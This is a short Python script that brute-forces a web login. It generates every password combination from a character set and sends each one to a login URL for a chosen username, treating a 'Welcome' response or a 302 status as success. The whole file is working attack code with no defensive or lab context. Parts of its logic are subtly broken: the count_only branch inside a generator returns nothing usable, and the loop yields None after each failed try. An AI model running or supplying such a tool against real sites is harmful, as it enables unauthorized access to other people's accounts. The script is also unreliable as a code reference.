import itertools
import requests

def generate_passwords(charset, min_len, max_len):
    for length in range(min_len, max_len + 1):
        for pwd in itertools.product(charset, repeat=length):
            yield ''.join(pwd)

def brute_force(url, username, charset, min_len, max_len, count_only=False):
    passwords = generate_passwords(charset, min_len, max_len)
    if count_only:
        return itertools.tee(passwords)[0]

    for password in passwords:
        try:
            response = requests.post(url, data={ "username": username, "password": password }, timeout=3)
            if "Welcome" in response.text or response.status_code == 302:
                print(f"[✔] Password found: {password}")
                yield password
                return
        except Exception:
            continue
        yield None
